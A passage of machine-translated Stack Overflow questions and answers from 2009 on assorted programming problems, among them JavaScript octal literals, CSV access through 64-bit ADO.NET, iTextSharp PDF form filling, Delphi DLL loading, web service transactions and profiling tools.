</body>
</html> 
```

在上面的代码中，如果我将它作为 10040 传递，而不是 01004，我会在警报框中得到正确的值。

对这个奇怪的案例有任何想法吗？

提前致谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-12T09:46:56.517

以零开头的数字文字被解释为八进制，因此写入 01004与写入 516*完全相同。*

其他一些答案建议在函数内部使用 parseInt 将八进制值转换为十进制。

这无济于事，因为数值 516 被传递给函数。如果你要求 parseInt 给你一个 base 10 的解释，你会得到 516！

解决此问题的方法是丢失前导零，或者如果需要零，则将其设为字符串文字而不是数字，并在函数内部使用 parseInt(num, 10)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-12T09:30:28.187

前导零可能使它认为该数字是八进制的。

更新：感谢@Paul Dixon 今天早上让我有些清醒。`01004`是一个文字，所以没有多少事后解析，即 ，`parseInt`将更新数字的基数。您需要去掉`0`代码中的前导以使其成为`1004`（最简单的解决方案），或者在文字周围加上引号以使其成为字符串，然后再将其发送到`parseInt`（我看不出有更多的工作）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T11:31:06.230

恭喜，您是第 100 万个被八进制文字绊倒的客户，这种语言源自 B（以及 C）的后裔。

你的奖品是在肯·汤普森家外面领导干草叉游行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T09:38:48.013

引用数字 -> '01004'

编辑：我看到 parseInt('01004', 10) 工作正常......我真的不知道为什么 parseInt(01004, 10) 不

EDIT2：好的，感谢 Paul Dixon

# stream - WebOrb 从我的网络摄像头录制

> ID：434907
> 
> 赞同：1
> 
> 时间：2009-01-12T09:29:26.740
> 
> 标签：stream, record, weborb

WebOrb 可以使用网络摄像头作为源录制视频 (flv) 流吗？如何？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2010-12-08T19:11:15.427

从 WebORB 4.2 开始，如果您提到 WebORB.Net 并且它们是最新安装程序中包含的示例，那么这是肯定的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-23T14:18:50.080

[他们在这里](https://stackoverflow.com/questions/44143/publishing-flash-video)谈论这个。

在 weborb 网站上，我找到[了这个](http://www.themidnightcoders.com/index.php?id=120)条目，所以它可以完成，但显然他们还没有用一个例子更新他们的网站......

# svn - 使用 CruiseControl .NET 和 Subversion 时处理 svn 锁/清理

> ID：434923
> 
> 赞同：3
> 
> 时间：2009-01-12T09:33:39.087
> 
> 标签：svn, cruisecontrol

我正在使用 CruiseControl .NET 和 Subversion 源代码控制插件来自动构建我们的项目。

一些项目会自动检查修改，但有时检查会失败，CruiseControl .NET 会将项目标记为“异常”：

```
ThoughtWorks.CruiseControl.Core.CruiseControlException: Source control operation failed: svn: Working copy 'xxFilename' locked svn: run 'svn cleanup' to remove locks (type 'svn help cleanup' for details) 
```

在此之后，我必须手动登录服务器并对文件夹进行 svn 清理，然后才能再次构建项目。有解决方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-06-08T13:33:36.780

新的 Cruise Control.Net 1.4.4 服务器在 Subversion 源代码控制块上有两个附加属性。

请参阅[CCNET 文档 - Subversion 源代码控制块](http://confluence.public.thoughtworks.org/display/CCNET/Subversion+Source+Control+Block)

cleanUp 和 revert 属性可以满足您的需求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T17:37:03.557

有点杂乱无章，但你能创建一个按需运行并进行 svn 清理的项目吗？

我知道您可以在 Java 版本的 CruiseControl 中使用，所以我假设您可以使用 CC.NET 执行相同的操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-24T07:06:19.567

您应该能够在项目配置中使用发布者任务。

项目[配置块](http://confluence.public.thoughtworks.org/display/CCNET/Project+Configuration+Block "配置块文档")有一个发布者任务，将在每次构建后执行。

使用[可执行任务](http://confluence.public.thoughtworks.org/display/CCNET/Executable+Task "可执行任务文档")，您可以将当前集成状态作为环境变量传递，这将允许您使用简单的脚本或命令来决定是否执行 svn cleanup。

例如，您只需要：
if %CCNetIntegrationStatus% == "Exception" svn cleanup

免责声明：我只真正玩过 CC，这是来自文档，而不是经验。

# asp.net - ASP.NET：FileUpload 控件因长文件名而失败

> ID：434926
> 
> 赞同：2
> 
> 时间：2009-01-12T09:34:53.937
> 
> 标签：asp.net, file-upload

我们的一位客户正在以各种可以想象的方式破坏该软件，而他刚刚发现了这个软件。

如果用户尝试上传文件名很长的文件（我认为用户正在尝试使用 180 个字符的文件名），FileUpload 控件拒绝在 IE7 上识别它。

单击“浏览”按钮，浏览到文件，单击它，单击“上传”按钮，应显示文件名的文本框为空白。有谁知道这个，修复等？

我设法找到了关于它的[这个 asp.net 论坛讨论](http://forums.asp.net/p/1366171/2839217.aspx)，但它并没有对这个问题有太多的了解。

该应用程序是用 Visual Studio 2008 编写的，这发生在 IE7 中，但不是 FF3 或 Chrome。如果我使用其他两个浏览器中的任何一个，它会正确填充 FileUpload 控件，但是当您实际尝试进行上传时会中断，因为生成的文件名/路径太长。

享受随机

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T11:06:48.477

这可能不是特定的 ASP.NET 甚至 IE7 问题。

Windows 对完整路径名 (*) 有 260 个字符的限制，这可以通过一些具有长文件名的嵌套文件夹轻松达到，特别是如果您从一个已经有相当长路径名的用户文件夹开始（例如。' C:\Documents and Settings\Brian Popalopadopaslopalos\My Documents' 或 'Desktop'）。

当你达到这个极限时，事情就开始变得糟糕了。重命名文件、移动文件夹、搜索等等都开始以奇怪的方式出错。如果浏览器也出现故障并且您可能无能为力，那就不足为奇了。

（* - 事情实际上比这要复杂一些，但仍然......）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T12:05:21.777

您需要更多地测试此问题，然后将其作为“已知问题”放入，给出您可以接受的文件名的最大大小。

他们可以将这些文件上传到 hotmail 吗？邮箱？和文件上传服务？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-13T02:28:54.763

进一步的测试似乎使它看起来像是路径名的 260 个字符限制，暴露了 IE7 中的错误。

我使用的文件名很长的测试文件位于我的“我的文档”目录中（所以“C:\Documents and Settings\Random\My Documents”）。试图浏览到这个文件导致它没有填写 FileUpload 文本框。

我将文件移动到我的 C: 驱动器的根目录，然后浏览到该文件，它工作正常（然后当我尝试实际上传它时崩溃，因为服务器上的路径名将超过 260 个字符，如果我使用的是 FF3 或 Chrome，就会发生这种情况）。

所以，看起来它是一些东西的组合，在 IE7 中显示了一个错误。

谢谢您的帮助。

# ado.net - 通过 64 位的 ADO.NET 访问 CSV？

> ID：434933
> 
> 赞同：4
> 
> 时间：2009-01-12T09:37:57.643
> 
> 标签：ado.net, csv, odbc, oledb

在 32 位 .NET 应用程序中，我可以使用此 OLEDB 连接字符串通过 ADO.NET 连接到 CSV 文件：

```
"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\foo;" 
```

或者这个 ODBC 之一：

```
"Driver={{Microsoft Text Driver (*.txt; *.csv)}};Dbq=c:\foo" 
```

然而，OLEDB Jet 驱动程序或 ODBC 文本驱动程序显然没有 64 位版本。

我可以逐行解析 CSV 或以 32 位模式运行应用程序，但理想情况下我只想找到一个以 64 位运行的不同驱动程序。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2011-06-08T19:21:50.377

我遇到了同样的问题，经过多次反复试验，我发现这是有效的：

**1.启用临时程序**

```
sp_configure 'show advanced options', 1;
RECONFIGURE;
GO
sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;
GO 
```

**2\. 在服务器上安装此文件：**

[http://www.microsoft.com/downloads/en/details.aspx?familyid=C06B8369-60DD-4B64-A44B-84B371EDE16D&displaylang=en](http://www.microsoft.com/downloads/en/details.aspx?familyid=C06B8369-60DD-4B64-A44B-84B371EDE16D&displaylang=en)

**3\. 使用这种查询格式：**

```
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=C:\SQL\;HDR=Yes;','SELECT * FROM [test.csv]'); 
```

**4\. 启用 OLE 自动化程序：**

```
sp_configure 'show advanced options', 1;
GO
RECONFIGURE with override
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE with override;
GO 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T18:05:58.850

亚历克西斯，

你真的需要司机吗？如果您只需要逐行读取 CSV 文件，则有许多免费的解析器。如果您还需要写出 CSV，请查看[FileHelpers](http://filehelpers.sourceforge.net/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T19:13:19.260

它不是驱动程序，但我对 Sebastien Lorion 的 CSV 阅读器很满意。请注意，我从未在 64 位环境中使用过它，但我不知道有任何兼容性问题。

[http://www.codeproject.com/KB/database/CsvReader.aspx](http://www.codeproject.com/KB/database/CsvReader.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T16:02:01.017

我最终不得不将我的应用程序转换为 32 位，因为我遇到了同样的问题，尽管访问的是 Microsoft Access 数据库。我知道这会起作用，但你可能不想要这个解决方案。如果有人知道这个问题的答案，我也很想听听。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-02-08T18:01:35.803

你很幸运——2010 年 12 月，Microsoft 发布了用于 CSV 和 XLSX 文件的 64 位 OLEDB 驱动程序！

请参阅[此答案](https://stackoverflow.com/questions/2617561/i-cannot-open-xlsx-file/4936544#4936544)以获取下载链接、安装详细信息、连接字符串等。

# ruby - 使用 Ruby Gem DBI

> ID：434935
> 
> 赞同：4
> 
> 时间：2009-01-12T09:38:33.147
> 
> 标签：ruby, rubygems, dbi

我想在共享的 linux 服务器上通过 ruby​​ 访问 MySQL。我想我需要使用 DBI 模块，但我似乎无法访问它。我安装它如下：

```
gem install -r dbi 
```

它无法将其安装在正常位置，因为我在共享服务器上并且没有权限：

```
WARNING:  Installing to ~/.gem since /usr/lib/ruby/gems/1.8 and
          /usr/bin aren't both writable.
WARNING:  You don't have ~/.gem/ruby/1.8/bin in your PATH,
          gem executables will not run. 
```

它似乎确实安装成功。

但是，现在当我尝试要求它时，我得到了一个错误。所以我的代码只是：

```
require 'dbi' 
```

这给出了以下错误：

```
dbi_test.rb:1:in `require': no such file to load -- dbi (LoadError)
    from dbi_test.rb:1 
```

我尝试将 LOAD_PATH 环境变量设置为 dbi.rb 所在的目录，但这没有任何区别。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2010-10-19T15:50:40.450

如果它作为 gem 安装，您还可以在解决问题之前需要 ruby​​gems，而无需设置 load_path

```
require 'rubygems'
require "dbi" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-12T09:54:46.907

我找到了答案。我需要在命令行上将 LOAD_PATH 指定为：

```
ruby -I$HOME/.gem/ruby/1.8/gems/dbi-0.4.1/lib/ dbi_test.r 
```

我一直将 LOAD_PATH 设置为标准的 UNIX 环境变量。哦！

# lisp - 如何使用 SBCL 的 SB-SPROF 分配分析？

> ID：434937
> 
> 赞同：4
> 
> 时间：2009-01-12T09:39:22.833
> 
> 标签：lisp, common-lisp, slime, sbcl

**更新：升级到 SBCL 1.0.24 解决了我的问题。（虽然我还需要将 SLIME 升级到 11-23-2008 修订版。稳定的 2006-04-20 修订版以及 CVS 的负责人似乎不适用于 SBCL 1.0.24。）**

SBCL 统计分析器的[文档](http://www.sbcl.org/manual/Statistical-Profiler.html)表明，除了 CPU 使用率之外，您还可以分析内存分配。然而，在我的一生中，我无法让它比一个微不足道的 Lisp 形式更多地描述。下面是一个例子：

```
CL-USER> (require :sb-sprof)
("SB-SPROF")
CL-USER> (defun ! (n)
           (if (= n 1)
               1
               (* n (! (- n 1)))))
!
CL-USER> (sb-sprof:with-profiling (:mode :alloc :loop nil :show-progress t :max-samples 100 :report :flat)
           (dotimes (n 100)
             (print n)
             (! 10)))
===> 0 of 100 samples taken.

0 
1 
2 
3 
4 
Profiler sample vector full (12 traces / 1000 samples), doubling the size
Profiler sample vector full (17 traces / 2000 samples), doubling the size
Profiler sample vector full (25 traces / 4000 samples), doubling the size
Profiler sample vector full (36 traces / 8000 samples), doubling the size
Profiler sample vector full (52 traces / 16000 samples), doubling the size
Profiler sample vector full (74 traces / 32000 samples), doubling the size 
```

此时，它通常会挂起。

有没有人在这方面取得成功？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T13:46:58.933

对我有用（即没有挂起），除了您的示例占用很少并且需要 1ms 运行，因此您可能想要获取更多样本并通过 :LOOP T 代替。

# asp.net - 从 Web 应用程序打印

> ID：434940
> 
> 赞同：8
> 
> 时间：2009-01-12T09:40:26.280
> 
> 标签：asp.net, web-applications, printing, itextsharp, itext

如何从 Web 应用程序生成纸质打印件？

具体来说，我正在考虑更复杂的纸质文件，如文凭、发票和合同。带有框架、表格、徽标和页眉/页脚的可变页数。

今天我对某些事情使用自定义表单和 CSS，而对其他事情使用 iTextSharp（我使用 asp.net 和 MS-SQL），但我认为这两种方法都非常耗时，并且很难在不同的文档中保持一致。

有没有更好的方法来解决它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T09:44:04.680

恕我直言，如果答案是固定格式打印 PDF

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-22T01:05:55.833

使用 iTextSharp 从头开始​​创建文档可能非常耗时。作为替代方案，您可以通过向它们添加表单域（如果需要）来创建（或重复使用）PDF“模板”文档。最简单的方法是使用完整版的 Adob​​e Acrobat，但您也可以只使用 iTextSharp 添加可填写的表单字段。

例如，对于奖励或文凭，您可以查找、创建或修改包含文档的所有文本、图形、精美边框和字体的 PDF，然后为收件人姓名添加表单域。您可以为日期、签名行、奖励类型等添加其他字段。

然后可以很容易地从您的 Web 应用程序中使用 iTextSharp 来填写表单、将其展平并将其流式传输回给用户。

这篇文章的最后是一个完整的 ASHX 处理程序代码示例。

还要记住，iTextSharp（或只是 iText）对于合并 PDF 文档或来自不同文档的页面也很有用。所以，对于封面或说明页设计固定但内容动态生成的年报，您可以打开封面页，打开报表的模板页面，将动态内容生成到模板的空白区域，打开背页“样板”，然后将它们全部组合成一个文档返回给用户。

```
using System;
using System.Data;
using System.Web;
using System.Collections;
using System.Web.Services;
using System.Web.Services.Protocols;
using System.Text;
using iTextSharp;
using iTextSharp.text;
using iTextSharp.text.pdf;

namespace iTextFormFillerDemo
{
    [WebService(Namespace = "http://tempuri.org/")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    public class DemoForm : IHttpHandler
    {

        public void ProcessRequest(HttpContext context)
        {

            context.Response.ContentType = "application/pdf";
            //This line will force the user to either open or save the 
            //file instead of it appearing on its own page - if you remove it, 
            //the page will appear in the browser in the same window.
            context.Response.AddHeader("Content-Disposition", 
                "attachment; filename=DemoForm_Filled.pdf");

            FillForm(context.Response.OutputStream);

            context.Response.End();
        }

        // Fills the form and pushes it out the output stream.
        private void FillForm(System.IO.Stream outputStream)
        {
            //Need to get the proper directory (dynamic path) for this file. 
            //This is a filesystem reference, not a web/URL reference...
            //The PDF reader reads in the fillable form
            PdfReader reader = new PdfReader("C:/DemoForm_Fillable.pdf");

            //The PDF stamper creates an editable working copy of the form from the reader 
            //and associates it with the response output stream
            PdfStamper stamper = new PdfStamper(reader, outputStream);

            //The PDF has a single "form" consisting of AcroFields
            //Note that this is shorthand for writing out 
            //stamper.AcroFields.SetField(...) for each set
            AcroFields form = stamper.AcroFields;

            //Set each of the text fields this way: SetField(name, value)
            form.SetField("txtFieldName", "Field Value");
            form.SetField("txtAnotherFieldName", "AnotherField Value");

            //Set the radio button fields using the names and string values:
            form.SetField("rbRadioButtons", "Yes"); //or "No"

            //Form flattening makes the form non-editable and saveable with the 
            //form data filled in
            stamper.FormFlattening = true;

            //Closing the stamper flushes it out the output stream
            stamper.Close();

            //We're done reading the file
            reader.Close();
        }

        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-12T09:50:00.597

尽管您已经声明您已经尝试过基于 CSS 的方法，但最好的方法是查看 @print 媒体类型 ( [http://www.w3.org/TR/CSS2/media.html](http://www.w3.org/TR/CSS2/media.html) ) . 基本上允许您使用与屏幕或任何其他（许多）媒体类型不同的样式表进行打印。

然后，如果你想自动启动一个打印事件，你想使用这样的东西（JavaScript）：

```
window.print(); 
```

当然，您必须检查浏览器实际上是否支持通过 JavaScript 进行打印，并采取相应措施：

```
function doPrint() {
    if(!window.print())
    {
        alert("Your browser does not support direct printing, please select 'Print' from the 'File' menu.");
    }
} 
```

但是，如果您坚持 CSS 不能满足您的需求，那么您可能需要转向基于 PDF 的解决方案。不过，我没有“通过”PDF 制作网络打印输出的经验。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T10:41:56.983

如果您使用的是 SQL Server，则可以使用报告服务创建报告。然后用户可以直接打印或将其导出为多种不同的格式（您可以控制哪些格式可供用户使用）。

我过去使用过这种方法，我发现它可以让我在打印或导出文档时更好地控制文档的外观。

# delphi - 为什么 LoadLibrary 只有在从 IDE 启动 EXE 时才会失败？

> ID：434948
> 
> 赞同：1
> 
> 时间：2009-01-12T09:45:11.933
> 
> 标签：delphi, dll, delphi-2009

在 Delphi 2009 上，在一个新的 VCL 项目上：

```
procedure TForm1.FormCreate(Sender: TObject);
var
    Handle: THandle;
begin
    Handle := loadlibrary('oci.dll');
    if Handle <> 0 then
    begin
        try
            ShowMessage('Success');
        finally
            FreeLibrary(Handle);
        end;
    end
    else
        ShowMessage('Fail');
end; 
```

如果我从 IDE 运行 EXE，它会失败，如果我从目录运行 EXE，只需双击它就成功了！！？？

请告诉我我错过了什么。

谢谢，弗雷德

编辑：通过 IDE 启动 EXE 适用于 Delphi 7！WTf是D2009的问题？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T09:50:55.853

LoadLibrary 失败的常见问题是所需的 DLL 不在[DLL 搜索路径中。](http://msdn.microsoft.com/en-us/library/7d83bc18(VS.80).aspx) D2009 可能由于某种原因没有搜索相同的文件夹。

为确保，您应该使用类似...的内容获取错误的更多详细信息

```
ShowMessage(SysErrorMessage(GetLastError)); 
```

尝试（甚至暂时）将“oci.dll”放在与项目的 .EXE 相同的目录中，然后再试一次。

以下是一些需要检查的事项：

*   oci.dll 位于哪个目录？
*   该目录是否包含在“PATH”环境变量中？如果没有，请尝试。
*   您是否可能在 Delphi Tools/Options/Env variables 屏幕中为 PATH 设置了 OVERRIDE？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T09:47:48.167

如果依赖的 DLL 在同一个目录中……确保你的启动目录就是它。

这在 Visual Studio 中也经常发生在我身上......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-04T13:22:59.803

我怀疑独立调用有效，因为 DLL 恰好位于当前目录中。

而且，当从 IDE 启动时，当前目录与 EXE 目录不同。

您是否尝试使用 DLL 的完整路径（例如，来自 ParamStr(0) 的路径加上 DLL 名称）？

# java - 事务回滚和 Web 服务

> ID：434950
> 
> 赞同：14
> 
> 时间：2009-01-12T09:46:54.660
> 
> 标签：java, web-services, transactions, ejb, rollback

给定一个从会话 bean 调用两个 Web 服务方法的示例，如果在调用两个方法之间抛出异常怎么办？在不调用 Web 服务的情况下，事务将回滚并且不会造成任何损害。但是，Web 服务不会回滚。当然，即使使用单个 Web 服务也存在问题。虽然这是一个通用问题，但我对与 EJB 会话 bean 相关的解决方案很感兴趣。

一个简单且定制的答案是为每个“真正的功能”方法添加一个特殊的“回滚方法”到 Web 服务。我要求的是一些标准化的方式来做到这一点。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-01-13T16:16:27.180

许多技术正在发展，但问题仍然是足够先进的，标准化过程尚未为我们提供完全可移植的解决方案。

选项一，您可以让 Web 服务事务感知。这当然假设您可以控制它们，尽管在某些情况下为非事务性服务编写事务感知代理也是一种选择。

WS-AT 和 WS-BA 协议是事务性 Web 服务的主要标准。不幸的是，他们只指定协议，而不是语言绑定。换句话说，在编程语言级别没有标准的 API。对于 Java，最接近的是 JSR-156，但它还没有准备好。

那么问题就变成了：如何将 EJB（即 JTA/XA）事务绑定到 WS 事务。由于 WS-AT 和 XA 协议使用的模型密切相关，这可以通过协议桥来实现。几个应用程序服务器单独提供了这些线路。JBoss 在 JavaOne 上展示了他们的 - 见[http://anonsvn.jboss.org/repos/labs/labs/jbosstm/workspace/jhalliday/txbridge/BOF-4182.odp](http://anonsvn.jboss.org/repos/labs/labs/jbosstm/workspace/jhalliday/txbridge/BOF-4182.odp)

请注意，协议桥接技术也可以反过来使用，以允许使用例如 XA 数据库后端的 EJB 公开为事务性 Web 服务。

但是，两阶段提交事务使用的锁定模型实际上只适用于同一控制域中的短期事务。如果您的服务在同一个公司数据中心运行，您可能会侥幸成功。对于更广泛的分布，无论是地理分布还是管理分布，您可能都想查看 WS-BA，这是一种专门为此类用途设计的 Web 服务事务协议。

WS-BA 使用一种更难编程的基于补偿的模型。它基本上基于您提到的技术：通过调用补偿方法来撤消服务方法的效果。这可能很难做到正确，但是 JBoss 实习生做了一个相当不错的注释框架，它允许您以最小的努力定义补偿方法并让它们自动驱动。它不是标准化的，但如果您选择这种方法，非常值得一试：[http ://www.jboss.org/jbosstm/baframework](http://www.jboss.org/jbosstm/baframework/index.html)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-13T16:47:47.103

据我所知，由 Microsoft、BEA Systems 和 IBM 开发的 Web Services-Coordination (WS-C) 和 Web Services-Transaction (WS-T) 规范用于此类情况。您可以从阅读IBM 提供的[Web 服务事务](http://www-128.ibm.com/developerworks/xml/library/x-transws/)和[Web 服务事务协议的比较](http://www.ibm.com/developerworks/webservices/library/ws-comproto/)文章开始看清楚。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-09-08T15:50:54.330

实际上，您通常不仅需要自定义回滚方法，还需要自定义提交方法。否则，您会遇到类似于 WS-BA 标准中的问题。

看看[http://www.atomikos.com/Publications/TryCancelConfirm](http://www.atomikos.com/Publications/TryCancelConfirm)查看详细文章。[Atomikos ExtremeTransactions](http://www.atomikos.com/Main/ExtremeTransactions)中提供了这些功能......该产品还支持经典的“ACID”风格的 Web 服务事务。

高温高压

盖伊

免责声明：我为 Atomikos 工作

# asp.net - ASP.NET AJAX WebForms 自定义错误处理问题

> ID：434959
> 
> 赞同：2
> 
> 时间：2009-01-12T09:53:25.350
> 
> 标签：asp.net, ajax, error-handling

我制作了一个具有以下架构的 Web 应用程序：每个表单都是一个 UserControl，只有一个实际页面 (Default.aspx)，并且 URL 中的一个参数指定要加载哪个 UserControl。UserControl 加载在 UpdatePanel 中，以便它可以享受完整的 AJAX 特性。

我还使用了一种精心设计的消息显示机制。最终，消息最终会出现在 Default.ASPX 顶部的一个指定区域中，并带有一些不错的格式化内容。

现在，我还想捕获源自 UserControl 的任何未处理的异常，并将其与我为消息制作的所有花里胡哨的内容一起显示在该区域中。

我怎样才能做到这一点？Page.Error 和 ScriptManager.AsyncPostBackError 不知何故对我不起作用......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-02-04T01:44:49.837

完整的答案在我的博客文章中 - [Unhide Exceptions Hidden By AJAX](http://blog.digitaltools.com/post/2010/02/03/Unhide-Exceptions-Hidden-By-AJAX.aspx)。

我确实使用 AsyncPostBackError() 将错误消息从通用的“调用目标抛出异常”更改为真正的错误消息。我为错误文本设置了一个标签，然后我告诉 AJAX 我处理了错误

```
args.set_errorHandled(true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T10:17:27.093

我不确定您的意思是主页上的 Page.Error 不起作用还是用户控件本身。如果您还没有这样做，您可以尝试创建以下类：

```
public class CustomUserControl : UserControl
{
   public new CustomUserControl
   {
      this.Error += new EventHandler(Page_Error);
   }

   protected void Page_Error(object source, EventArgs e)
   {
      Exception exception = HttpContext.Current.Server.GetLastError();
      // Message away
   }
} 
```

然后将所有用户控件更改为继承此类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-10T16:06:34.260

您能否详细说明您对 ScriptManager.AsyncPostBackError 的尝试？那真的应该是正确的使用方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-05-18T20:28:22.413

对于未处理的错误，请查看 Global.asax 文件...

```
protected void Application_Error(object sender, EventArgs e)
{

    //  fired when an unhandled error occurs within the application.
    //  ..or use an HttpModule instead
} 
```

或者创建一个自定义的 HttpModule，而不是插入你的 web.config ...

```
public class UnhandledExceptionModule : IHttpModule
{
    #region IHttpModule Members
    public void Dispose()
    {
    }

    public void Init(HttpApplication app)
    {           
        app.Error += new EventHandler(app_Error);
    }

    protected void app_Error(object sender, EventArgs e)
    {
        HttpApplication app = sender as HttpApplication;
                Exception ex =  app.Server.GetLastError().GetBaseException(); 
```

# c# - Silverlight：如何使用 System.Net.WebClient 忽略（缺少）crossdomain.xml？

> ID：434962
> 
> 赞同：2
> 
> 时间：2009-01-12T09:53:58.373
> 
> 标签：c#, .net, silverlight, cross-domain, webclient

用于执行 HTTP 请求时出现安全异常`System.Net.WebClient`，这是由于目标服务器上的`crossdomain.xml`or`clientaccesspolicy.xml`丢失或限制过多。我知道这是有充分理由的（cookies 和跨站点请求伪造），但它不适用于我的情况，因为我只需要在**不使用 cookie 或任何花哨的东西的情况下对任意 URL 执行纯 HTTP GET 请求**。

我已经想到了一个可以获取 URL 的代理的想法，但这听起来更像是一个丑陋的解决方法，更不用说浪费带宽了。

在 Silverlight 中执行此操作的方法是什么（如果有的话）？我使用正确的课程吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T10:00:24.650

我认为这实际上是不可能的，至少对于 WebClient。整个想法是限制（保护......）客户端免受对其他服务器的不需要的请求。

为了解决这个问题，您可以做的是拥有一个代理 Web 服务，该服务将从您的 Web 服务器调用“任意 URL”，并将结果传递回 Silverlight 客户端。这样，在您实现所需功能的同时，客户端仍然受到保护。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-13T01:21:32.307

你为什么要摆脱它？

如果您分析 Silverlight 请求……在跨域方案中，它们总是调用 clientaccesspolicy.xml 文件。您无法更改此行为（在 Silverlight 运行时内部）。此外，如果它没有找到 clientaccessolicy.xml 文件，它会调用 Flash/Flex 等效项 (crossdomain.xml)。如果两者都不存在或不允许来自该域的请求，您的请求将失败。

我写了一篇关于使用 HttpHandlers 的文章，以便不必将这些 XML 文件放在本地 Web 服务器上，并且可以使它们动态化。文章位于：

[http://silverlighthack.com/post/2008/11/08/Silverlight-clientaccesspolicyxml-files-for-the-Enterprise-(Part-1-of-2).aspx](http://silverlighthack.com/post/2008/11/08/Silverlight-clientaccesspolicyxml-files-for-the-Enterprise-(Part-1-of-2).aspx)

# c - C代码库中的全局变量识别

> ID：434968
> 
> 赞同：3
> 
> 时间：2009-01-12T09:56:23.563
> 
> 标签：c, linker

我有一个 C 代码库，需要以编程方式识别所有使用的全局变量。我认为 gcc 可以用来生成内存映射文件，但不知道如何，这可能让我看到哪些变量是全局的？任何帮助，将不胜感激。

干杯

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-12T10:32:17.157

您可以使用`nm`.

```
nm *.o | grep OBJT | grep GLOB 
```

**上面的EDIT** 命令适用于 Solaris 的 nm（SUNWbtool 软件包）。为了便携性，`nm`有一个参数来选择输出格式：

```
nm -f [posix|bsd|sysv] *.o 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T10:18:42.613

输出内存映射的选项是带有链接器的 -M，因此要从 gcc 获取它，您必须使用`gcc .... -Xlinker -M`.

获得这些的另一种方法是使用该`ctags`程序。它不仅可以标记可用的函数，还可以标记可用的全局变量（并且不收集静态数据，这与内存映射不同）。因为它不能编译所有东西，所以它也应该比 gcc 方法更快（如果你必须编译，你当然可以免费获得）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T10:05:12.937

为什么你需要知道这个？出于很多目的，静态数据（无论是在文件范围内还是在函数范围内）都应该与全局变量一起分组。

通常，全局变量确实显示为数据，而不是链接器映射中的代码。堆栈变量和堆分配变量没有。（当然，*指向*堆分配数据的指针可以是全局的；这只是 C 中指针和它所指向的内容之间的常规区别。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T10:54:18.097

如果您有`dwarfdump`并且您的二进制文件包含 DWARF 调试信息（未剥离），您可以通过运行检查`.debug_pubnames`DWARF 部分的内容

`dwarfdump -p mybinary | awk '{print $2}'`

它将生成一组带有全局符号名称的行，每行一个。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-29T18:32:47.663

我喜欢 gdb 的“信息变量”来做到这一点。

此处列出： [C 代码库中的全局变量标识](https://stackoverflow.com/questions/434968/global-variable-identification-in-c-code-base)

# optimization - 如何分析和优化 XSLT？

> ID：434976
> 
> 赞同：31
> 
> 时间：2009-01-12T09:59:02.857
> 
> 标签：optimization, xslt, profiling

我有一个用于在浏览器中查看 XML 文件的 XSLT。XSLT 的编写很简单，目前需要很长时间才能执行（几分钟）。

我的 XML 文件大小适中 (~1 MiB)，对于同一文档执行不同处理的其他 XSLT 执行得更快。所以我知道问题不是 XML 的大小，而是我的 XSLT。

我该如何分析和优化我的 XSLT？

（在浏览器中执行复杂的 XSLT 是不是一个坏主意？我应该改为应用 XSLT 应用程序端吗？）

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2009-01-12T10:04:00.133

您使用的是哪个 XSLT 引擎？如果您使用的是 .NET 引擎和 Visual Studio，您可以使用集成到 Visual Studio 中的[XSLT 分析器](http://msdn.microsoft.com/en-us/library/dd456801%28v=vs.110%29.aspx)，这非常有用。

其他优秀的分析工具是 Altova 的[XML Spy](http://www.altova.com/products/xmlspy/xslt_profiler.html)和[Oxygen](http://www.oxygenxml.com/)。

